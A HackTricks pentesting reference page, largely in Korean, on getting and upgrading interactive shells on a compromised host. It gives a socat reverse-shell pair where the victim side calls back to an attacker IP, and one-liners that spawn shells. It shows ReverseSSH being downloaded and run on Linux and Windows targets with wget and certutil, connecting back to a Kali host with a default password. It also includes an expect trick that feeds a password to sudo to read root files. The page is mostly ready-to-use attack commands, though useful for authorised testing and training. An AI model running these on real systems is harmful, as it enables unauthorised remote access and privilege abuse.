# Full TTYs

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}

## Full TTY

`SHELL` 변수에 설정한 셸은 **반드시** _**/etc/shells**_에 **목록에 있어야** 하며, 그렇지 않으면 `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`라는 메시지가 표시됩니다. 또한, 다음 스니펫은 bash에서만 작동합니다. zsh에 있는 경우 `bash`를 실행하여 셸을 얻기 전에 bash로 변경하십시오.

#### Python

{% code overflow="wrap" %}
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

{% hint style="info" %}
**`stty -a`**를 실행하여 **행**과 **열**의 **수**를 확인할 수 있습니다.
{% endhint %}

#### 스크립트

{% code overflow="wrap" %}
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}

#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **쉘 생성**

* `python -c 'import pty; pty.spawn("/bin/sh")'`
* `echo os.system('/bin/bash')`
* `/bin/sh -i`
* `script -qc /bin/bash /dev/null`
* `perl -e 'exec "/bin/sh";'`
* perl: `exec "/bin/sh";`
* ruby: `exec "/bin/sh"`
* lua: `os.execute('/bin/sh')`
* IRB: `exec "/bin/sh"`
* vi: `:!bash`
* vi: `:set shell=/bin/bash:shell`
* nmap: `!sh`

## ReverseSSH

**대화형 쉘 접근** 및 **파일 전송**과 **포트 포워딩**을 위한 편리한 방법은 정적으로 연결된 ssh 서버 [ReverseSSH](https://github.com/Fahrj/reverse-ssh)를 타겟에 배포하는 것입니다.

아래는 upx로 압축된 바이너리를 사용하는 `x86`의 예입니다. 다른 바이너리에 대해서는 [릴리스 페이지](https://github.com/Fahrj/reverse-ssh/releases/latest/)를 확인하세요.

1. ssh 포트 포워딩 요청을 수신하기 위해 로컬에서 준비합니다:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
{% endcode %}

* (2a) 리눅스 타겟:

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
{% endcode %}

* (2b) Windows 10 대상 (이전 버전은 [프로젝트 읽기](https://github.com/Fahrj/reverse-ssh#features)를 확인하세요):

{% code overflow="wrap" %}
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
{% endcode %}

* ReverseSSH 포트 포워딩 요청이 성공했다면, 이제 `reverse-ssh(.exe)`를 실행하는 사용자의 컨텍스트에서 기본 비밀번호 `letmeinbrudipls`로 로그인할 수 있어야 합니다:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope)는 리눅스 리버스 셸을 자동으로 TTY로 업그레이드하고, 터미널 크기를 처리하며, 모든 것을 기록하고 그 외에도 많은 기능을 제공합니다. 또한 Windows 셸에 대한 readline 지원을 제공합니다.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

어떤 이유로 전체 TTY를 얻을 수 없는 경우에도 **여전히 사용자 입력을 기대하는 프로그램과 상호작용할 수 있습니다**. 다음 예제에서는 비밀번호가 `sudo`에 전달되어 파일을 읽습니다:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**모바일 보안**에 대한 전문성을 심화하세요. 8kSec 아카데미를 통해 iOS 및 Android 보안을 마스터하고 인증을 받으세요:

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
